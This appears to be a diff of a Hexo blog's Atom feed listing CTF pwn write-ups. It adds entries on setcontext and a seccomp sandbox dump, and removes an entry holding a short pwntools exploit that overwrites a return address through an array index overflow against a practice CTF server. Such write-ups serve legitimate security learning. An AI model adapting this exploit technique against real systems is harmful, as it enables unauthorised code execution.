@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-10-30T12:18:14.291Z</updated>
+  <updated>2019-10-31T11:35:28.128Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,46 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>setcontext 函数</title>
+    <link href="http://yoursite.com/2019/10/31/setcontext/"/>
+    <id>http://yoursite.com/2019/10/31/setcontext/</id>
+    <published>2019-10-31T11:24:18.458Z</published>
+    <updated>2019-10-31T11:35:28.128Z</updated>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;ucontext.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;setcontext&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;ucontext_t&lt;/span&gt; *ucp)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>UNCTF-orwheap</title>
+    <link href="http://yoursite.com/2019/10/31/UNCTF-orwheap/"/>
+    <id>http://yoursite.com/2019/10/31/UNCTF-orwheap/</id>
+    <published>2019-10-31T11:04:36.449Z</published>
+    <updated>2019-10-31T11:39:52.424Z</updated>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ seccomp-tools dump ./pwn &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0000: 0x20 0x00 0x00 0x00000004  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0002: 0x20 0x00 0x00 0x00000000  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0003: 0x35 0x07 0x00 0x40000000  if (A &amp;gt;= 0x40000000) goto 0011&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0006: 0x20 0x00 0x00 0x00000024  A = count &amp;gt;&amp;gt; 32 # write(fd, buf, count)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0011: 0x06 0x00 0x00 0x00000000  return KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>10.26星盟awd之magic_heap</title>
@@ -391,29 +431,6 @@
 &lt;p&gt;方法3：&lt;br&gt;同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-e809aec7c4485e87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-9c69b4d18ca86e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>hackme.inndy之pwn</title>
-    <link href="http://yoursite.com/2019/03/28/hackme.inndy%E4%B9%8Bpwn/"/>
-    <id>http://yoursite.com/2019/03/28/hackme.inndy之pwn/</id>
-    <published>2019-03-28T13:59:21.457Z</published>
-    <updated>2019-05-09T12:16:36.909Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;catflag&quot;&gt;&lt;a href=&quot;#catflag&quot; class=&quot;headerlink&quot; title=&quot;catflag&quot;&gt;&lt;/a&gt;catflag&lt;/h2&gt;&lt;p&gt;nc 连接直接get shell &lt;/p&gt;
-&lt;h2 id=&quot;homeosrk&quot;&gt;&lt;a href=&quot;#homeosrk&quot; class=&quot;headerlink&quot; title=&quot;homeosrk&quot;&gt;&lt;/a&gt;homeosrk&lt;/h2&gt;&lt;p&gt;数组下标溢出，绕过canary保护直接修改ret地址为后门函数&lt;code&gt;call_me_mabe&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;\images\piture\1.png&quot; alt&gt;&lt;/p&gt;
-&lt;p&gt;这里可以算出arr[14]为ret位置&lt;/p&gt;
-&lt;p&gt;exp:&lt;/p&gt;
-&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# p = process(&#39;./homework&#39;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = remote(&lt;span class=&quot;string&quot;&gt;&#39;hackme.inndy.tw&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7701&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call_me = &lt;span class=&quot;number&quot;&gt;0x80485FB&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; str(call_me)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;What\&#39;s your name? &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;n0va&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;4 &amp;gt; dump all numbers\n&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39; &amp;gt; &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;1&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;Index to edit: &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;14&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;How many? &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(str(call_me))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
     
     </summary>
     
